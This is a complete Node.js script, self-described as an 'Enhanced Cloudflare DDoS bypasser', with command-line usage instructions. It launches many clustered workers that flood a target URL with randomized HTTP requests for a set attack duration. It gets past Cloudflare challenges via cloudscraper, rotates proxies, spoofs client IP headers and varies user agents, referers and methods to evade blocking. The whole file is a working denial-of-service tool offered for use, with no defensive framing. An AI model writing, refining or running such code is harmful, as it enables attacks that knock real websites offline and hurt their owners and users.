const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require("randomstring");
const fs = require('fs');
const { SocksProxyAgent } = require('socks-proxy-agent');
const cluster = require('cluster');
const os = require('os');
const urlParser = require('url');
const tls = require('tls');

// Configuration
const CONCURRENCY = os.cpus().length * 150; // Adjust based on your system
const REQUEST_RATE_LIMIT = 2000; // Max requests per second (per worker)
const MAX_RETRIES = 3;

// HTTP Methods
const Methods = [
    "GET", 
    "HEAD", 
    "POST", 
    "PUT", 
    "DELETE", 
    "CONNECT", 
    "OPTIONS", 
    "TRACE", 
    "PATCH", 
    "PURGE", 
    "LINK", 
    "UNLINK"
];

// Enhanced HTTP Status Codes
const httpStatusCodes = {
    // 2xx Success
    OK: 200,
    CREATED: 201,
    ACCEPTED: 202,
    NO_CONTENT: 204,
    PARTIAL_CONTENT: 206,
    
    // 3xx Redirection
    MOVED_PERMANENTLY: 301,
    FOUND: 302,
    SEE_OTHER: 303,
    NOT_MODIFIED: 304,
    TEMPORARY_REDIRECT: 307,
    PERMANENT_REDIRECT: 308,
    
    // 4xx Client Errors
    BAD_REQUEST: 400,
    UNAUTHORIZED: 401,
    FORBIDDEN: 403,
    NOT_FOUND: 404,
    METHOD_NOT_ALLOWED: 405,
    NOT_ACCEPTABLE: 406,
    REQUEST_TIMEOUT: 408,
    CONFLICT: 409,
    GONE: 410,
    PAYLOAD_TOO_LARGE: 413,
    URI_TOO_LONG: 414,
    UNSUPPORTED_MEDIA_TYPE: 415,
    TOO_MANY_REQUESTS: 429,
    
    // 5xx Server Errors
    INTERNAL_SERVER_ERROR: 500,
    NOT_IMPLEMENTED: 501,
    BAD_GATEWAY: 502,
    SERVICE_UNAVAILABLE: 503,
    GATEWAY_TIMEOUT: 504,
    HTTP_VERSION_NOT_SUPPORTED: 505,
    NETWORK_AUTHENTICATION_REQUIRED: 511
};

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 9; BLA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.3; GT-I9300) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G530F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36'
];

const referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://youtube.com/",
    "https://github.com/",
    "https://www.pinterest.com/search/?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/"
];

const paths = [
    "",
    "/",
    "/index.html",
    "/home",
    "/search",
    "/api/v1/test",
    "/wp-admin",
    "/admin",
    "/login",
    "/register",
    "/contact",
    "/about",
    "/products",
    "/services",
    "/blog"
];

const tlsVersions = [
    "TLS_method",
    "TLSv1_1_method",
    "TLSv1_2_method",
    "TLSv1_3_method"
];

const ALPNProtocols = [
    'h2', 
    'http/1.1', 
    'spdy/3.1', 
    'http/1.2', 
    'http/2', 
    'http/2+quic/43', 
    'http/2+quic/44',
    'h3',
    'h3-29',
    'h3-28',
    'h3-27',
    'h3-T051',
    'h3-Q050',
    'h3-Q046',
    'h3-Q043',
    'quic',
    'hq',
    'doq',
    'doq-h3',
    'h3-fb',
    'h3-uber',
    'h3-23',
    'h3-25'
];

let proxies = [];
let currentProxyIndex = 0;
let requestCount = 0;
let lastResetTime = Date.now();

function createSecureContext() {
    return tls.createSecureContext({
        minVersion: 'TLSv1.1',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_128_GCM_SHA256',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES128-GCM-SHA256'
        ].join(':'),
        honorCipherOrder: true,
        ALPNProtocols: ALPNProtocols
    });
}

function checkRateLimit() {
    const now = Date.now();
    if (now - lastResetTime >= 1000) {
        requestCount = 0;
        lastResetTime = now;
    }
    return ++requestCount <= REQUEST_RATE_LIMIT;
}

function generateFakeIP() {
    const ranges = [
        () => `1.${randomByte(1, 255)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `5.${randomByte(1, 255)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `45.${randomByte(1, 255)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `80.${randomByte(1, 255)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `104.${randomByte(16, 31)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `172.${randomByte(16, 31)}.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `192.168.${randomByte(1, 255)}.${randomByte(1, 254)}`,
        () => `216.${randomByte(1, 255)}.${randomByte(1, 255)}.${randomByte(1, 254)}`
    ];
    return ranges[Math.floor(Math.random() * ranges.length)]();
}

function randomByte(min = 0, max = 255) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getRandomReferer() {
    return referers[Math.floor(Math.random() * referers.length)];
}

function getRandomPath() {
    return paths[Math.floor(Math.random() * paths.length)];
}

function getRandomTLSVersion() {
    return tlsVersions[Math.floor(Math.random() * tlsVersions.length)];
}

function getRandomMethod() {
    return Methods[Math.floor(Math.random() * Methods.length)];
}

function loadProxies() {
    try {
        console.log("[+] Loading proxies from proxy.txt...");
        const proxyFile = fs.readFileSync('proxy.txt', 'utf8');
        proxies = proxyFile.split('\n')
            .map(proxy => proxy.trim())
            .filter(proxy => proxy.length > 0)
            .map(proxy => {
                if (!proxy.startsWith('http://') && !proxy.startsWith('https://') && !proxy.startsWith('socks://')) {
                    return `http://${proxy}`;
                }
                return proxy;
            });
        console.log(`[+] Loaded ${proxies.length} proxies from file`);
    } catch (err) {
        console.log('[!] Error loading proxy.txt:', err.message);
        process.exit(1);
    }
}

function getNextProxy() {
    if (proxies.length === 0) return null;
    currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
    return proxies[currentProxyIndex];
}

function normalizeTargetUrl(url) {
    // Add https:// if no protocol is specified (forces HTTPS)
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        url = 'https://' + url; // Default to HTTPS
    }
    
    // Parse the URL to ensure it's valid
    const parsed = urlParser.parse(url);
    if (!parsed.hostname) {
        console.log('[!] Invalid URL format');
        process.exit(1);
    }
    
    // Force port 443 (HTTPS) if not already specified
    if (!parsed.port) {
        return `https://${parsed.hostname}:443`; // Explicitly add :443
    }
    
    // If port was already in URL, keep it as-is
    return `${parsed.protocol}//${parsed.hostname}`;
}

function createRequestOptions(url, path, cookie, useragent, referer) {
    const ip = generateFakeIP();
    const rand = randomstring.generate({
        length: 10,
        charset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    });
    
    const method = getRandomMethod();
    const isPost = method === 'POST';
    
    const options = {
        url: url + path,
        method: method,
        headers: {
            'User-Agent': useragent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'cookie': cookie,
            'Origin': 'http://' + rand + '.com',
            'Referer': referer,
            'X-Forwarded-For': ip,
            'X-Real-IP': ip,
            'X-Client-IP': ip,
            'X-Requested-With': 'XMLHttpRequest'
        },
        gzip: true,
        timeout: 10000,
        secureProtocol: getRandomTLSVersion(),
        ALPNProtocols: ALPNProtocols,
        followRedirect: true,
        followAllRedirects: true,
        maxRedirects: 5,
        rejectUnauthorized: false, // Bypass SSL verification
        secureContext: createSecureContext() // Custom secure context
    };
    
    // Add random POST data if method is POST
    if (isPost) {
        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        options.body = randomstring.generate({
            length: 100,
            charset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        });
    }
    
    const proxyUrl = getNextProxy();
    if (proxyUrl) {
        if (proxyUrl.startsWith('socks')) {
            options.agent = new SocksProxyAgent(proxyUrl);
        } else {
            options.proxy = proxyUrl;
        }
    }
    
    return options;
}

async function makeRequest(url, time) {
    if (!checkRateLimit()) {
        await new Promise(resolve => setTimeout(resolve, 100));
        return;
    }
    
    let retries = 0;
    const path = getRandomPath();
    const referer = getRandomReferer();
    const useragent = getRandomUserAgent();
    
    while (retries < MAX_RETRIES) {
        try {
            const cloudflareOptions = createRequestOptions(url, path, '', useragent, referer);
            delete cloudflareOptions.headers.cookie;
            
            const response = await cloudscraper.get(cloudflareOptions);
            const cookie = response.request.headers.cookie || '';
            
            const options = createRequestOptions(url, path, cookie, useragent, referer);
            request(options, (error, response) => {
                if (!error && response) {
                    const statusCode = response.statusCode;
                    let statusMessage = 'Unknown';
                    
                    // Match status code with our enhanced list
                    for (const [key, value] of Object.entries(httpStatusCodes)) {
                        if (value === statusCode) {
                            statusMessage = key;
                            break;
                        }
                    }
                    
                    console.log(`[+] ${options.method} Request sent to ${options.url} - Status: ${statusCode} (${statusMessage}) - IP: ${options.headers['X-Forwarded-For']}${options.proxy || options.agent ? ' via proxy' : ''}`);
                } else if (error && retries === MAX_RETRIES - 1) {
                    console.log(`[!] Request error: ${error.message}`);
                }
            });
            
            break;
        } catch (error) {
            retries++;
            if (retries === MAX_RETRIES) {
                console.log(`[!] Max retries reached for request: ${error.message}`);
            }
        }
    }
}

if (process.argv.length <= 2) {
    console.log("\nEnhanced Cloudflare DDoS bypasser with HTTP/HTTPS and proxy support\n");
    console.log("Usage: node CFBypass.js <url> <time> [proxy]");
    console.log("Example: node CFBypass.js example.com 60");
    console.log("Example: node CFBypass.js https://example.com 60 proxy");
    console.log("Optional: Add 'proxy' argument to enable proxy rotation from proxy.txt");
    process.exit(-1);
}

const targetUrl = normalizeTargetUrl(process.argv[2]);
const attackTime = parseInt(process.argv[3]) || 60;
const useProxies = process.argv[4] === 'proxy';

if (useProxies) {
    loadProxies();
}

if (cluster.isMaster) {
    console.log(`Target URL: ${targetUrl}`);
    console.log(`Attack duration: ${attackTime} seconds`);
    console.log(`Proxy support: ${useProxies ? 'Enabled' : 'Disabled'}`);
    console.log(`Launching ${CONCURRENCY} workers...`);
    
    // Enable load balancing
    cluster.schedulingPolicy = cluster.SCHED_RR;
    for (let i = 0; i < CONCURRENCY; i++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        console.log('[+] Attack completed, shutting down workers');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, attackTime * 1000);
} else {
    const attackInterval = setInterval(() => {
        makeRequest(targetUrl, attackTime);
    }, 10);
    
    process.on('exit', () => {
        clearInterval(attackInterval);
    });
}

process.on('uncaughtException', (err) => {
    console.log('[!] Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (err) => {
    console.log('[!] Unhandled Rejection:', err.message);
});
